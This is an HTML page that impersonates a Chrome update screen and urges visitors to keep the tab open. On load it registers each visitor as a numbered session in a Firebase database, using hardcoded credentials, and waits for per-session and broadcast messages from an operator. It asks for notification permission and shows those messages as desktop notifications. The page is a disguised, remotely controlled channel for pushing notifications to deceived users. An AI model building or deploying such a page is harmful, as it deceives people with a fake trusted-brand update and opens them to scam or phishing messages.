<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Updating Chrome</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <style>
    body { font-family: sans-serif; background: #f1f3f4; height: 100vh; display: flex; justify-content: center; align-items: center; }
    .box { background: white; padding: 2rem; border-radius: 10px; box-shadow: 0 5px 20px rgba(0,0,0,0.1); max-width: 400px; text-align: center; }
    h1 { color: #1a73e8; }
  </style>
</head>
<body>
  <div class="box">
    <h1>Updating Chrome…</h1>
    <p>Do not close this tab.</p>
    <p id="session-name">Connecting…</p>
  </div>

  <!-- Firebase -->
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>

  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyDSpv4ci1qJo3Oi5WA4gj1pxrBXjxaYYao",
      authDomain: "notify-78da1.firebaseapp.com",
      databaseURL: "https://notify-78da1-default-rtdb.firebaseio.com",
      projectId: "notify-78da1",
      storageBucket: "notify-78da1.appspot.com",
      messagingSenderId: "936289141781",
      appId: "1:936289141781:web:065ef577df0aa61f40fa1c"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    const sessionLabel = document.getElementById("session-name");

    // Get the next available session name
    db.ref("sessions").once("value", snapshot => {
      const sessions = snapshot.val() || {};
      const sessionCount = Object.keys(sessions).length + 1;
      const sessionId = `chrome-${sessionCount}`;
      sessionLabel.textContent = `Session: ${sessionId}`;

      const sessionRef = db.ref(`sessions/${sessionId}`);
      sessionRef.on("value", snap => {
        const data = snap.val();
        if (data && data.title && data.message) {
          if (Notification.permission !== "granted") {
            Notification.requestPermission();
          }
          new Notification(data.title, { body: data.message });
          sessionRef.set({}); // clear after showing
        }
      });

      // Listen for broadcast
      db.ref("broadcast").on("value", snap => {
        const data = snap.val();
        if (data && data.title && data.message) {
          if (Notification.permission !== "granted") {
            Notification.requestPermission();
          }
          new Notification(data.title, { body: data.message });
        }
      });

      // Keep session alive
      sessionRef.set({ active: true });
    });
  </script>
</body>
</html>
